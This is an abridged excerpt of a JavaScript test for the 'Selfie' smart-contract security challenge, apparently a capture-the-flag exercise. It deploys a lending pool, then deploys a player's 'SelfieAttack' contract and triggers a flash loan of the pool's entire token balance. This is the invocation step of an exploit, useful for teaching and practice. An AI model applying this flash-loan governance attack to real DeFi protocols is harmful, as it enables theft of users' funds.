...
describe("[Challenge] Selfie", function () {
  ...
  before(async function () {
    ...
    // Deploy the pool
    pool = await (await ethers.getContractFactory("SelfiePool", deployer)).deploy(token.address, governance.address)
  ...
  it("Execution", async function () {
    ...
    let selfieAttack = await (
      await ethers.getContractFactory("SelfieAttack", player)
    ).deploy(governance.address, token.address, pool.address)

    await selfieAttack.executeFlashLoan(selfieAttack.address, token.address, TOKENS_IN_POOL, "")
  })
